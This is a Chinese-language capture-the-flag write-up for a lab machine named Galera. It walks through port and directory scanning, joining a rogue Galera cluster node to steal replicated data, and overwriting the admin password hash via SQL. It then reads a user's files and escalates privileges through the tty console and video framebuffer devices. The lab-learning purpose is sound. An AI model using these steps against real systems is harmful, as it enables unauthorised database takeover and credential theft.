# Galera HVM

> 日期：2025-07-02 ｜ 作者：dehua ｜ 标签：第一个wp博客，有什么改进的可以留下评论

---

## 信息收集阶段

首先对目标进行端口扫描，发现开放的服务如下：

```bash
nmap -sC -sV -A 192.168.1.100
```

```
22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey:
| 256 28:50:32:2f:bb:ef:7e:51:c3:59:cb:e6:40:88:0e:4e (ECDSA)
|_256 f3:fa:a1:84:c6:da:fc:09:fe:aa:ca:ec:0a:29:7d:30 (ED25519)
80/tcp open http Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Login
4567/tcp open tram?
```

---

## 漏洞利用过程

发现 80 端口是一个登录页面，进行目录扫描：

```bash
gobuster dir -u http://192.168.218.181/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -x php,txt,html
```

```
/login.php (Status: 302) [--> /]
/logout.php (Status: 302) [--> index.php]
/config.php (Status: 200)
/upload (Status: 301) [--> /upload/]
/private.php (Status: 403)
/info.php (Status: 200)
/index.php (Status: 200)
/server-status (Status: 403)
```

> 发现一个 `info.php` 页面，是标准的 PHP 配置信息页面；其他页面基本无用。
>
> 查看 `index.php` 源码，发现一个隐藏的 `token`，但初步分析似乎没有实际用途。
>
> 4567 端口通过搜索发现与 **Galera Cluster** 有关，是集群节点通信端口。

### Galera Cluster 特性：

- 同步复制  
- 多主结构  
- 自动成员资格管理  
- 节点自动加入集群  
- 行级并行复制  
- 任意节点可直连访问

后来参考一位大佬的 WP，发现可以伪装节点加入集群。

```ini
[galera]
wsrep_on = ON
wsrep_provider = /usr/lib/galera/libgalera_smm.so
wsrep_cluster_address = "gcomm://192.168.218.181:4567"
wsrep_node_name = "sunset"
wsrep_node_address = "192.168.218.148"
binlog_format = row
default_storage_engine = InnoDB
wsrep_sst_method = rsync
bind-address = 0.0.0.0
```

重启数据库服务后成功同步，拿到对方数据库信息：

![Image](https://github.com/user-attachments/assets/9bed1578-e989-49a2-a367-0d114ce571df)

开始还想着爆破，但是太慢了，后面一想，反正会同步复制数据，我直接改。

```sql
update users set password = "$2a$10$3NvG5rz1vFOz.bGrDxKI3eAH3WlC1QDGF7Yl5s7WEvKRAUAjuTkZO" where username = "admin"
```

多次尝试登录后台，成功进入后修改首页内容：

![Image](https://github.com/user-attachments/assets/973f14ed-abe4-4ec4-b6cf-ff5c666e3f3d)

接着尝试拿 webshell，但函数被禁用，只能用伪协议查看敏感文件：

![Image](https://github.com/user-attachments/assets/87e047b3-260e-4a90-a3af-19d61022c6c5)

![Image](https://github.com/user-attachments/assets/c0ab0d0b-88e4-4fc0-bd8f-1e03474a5d58)

发现用户 `donjuandeaustria`，随后获得 shell 权限：

![Image](https://github.com/user-attachments/assets/42394c3c-5989-470e-ab54-2488be66a1a6)

---

## 提权过程

使用 linpeas 发现 root 在 tty20 终端，自己属于多个组，其中 `tty` 是关键：

```bash
cat /dev/vcs20
# 或
cat /dev/vcsa20
```

![Image](https://github.com/user-attachments/assets/1269ea35-b1f2-4c9c-a390-3ca213409a04)

### 📌 video 组提权思路（HackTricks）

目标用户属于 `video` 组：  
👉 https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html#video-group

```bash
donjuandeaustria@galera:/dev$ cat /dev/fb0 > /tmp/screen.raw
donjuandeaustria@galera:/dev$ cat /sys/class/graphics/fb0/virtual_size
1280,800
```

将 `/tmp/screen.raw` 下载后查看，但似乎无内容：

![Image](https://github.com/user-attachments/assets/1e01ea30-1b7d-428c-90fd-75a7883a3a89)
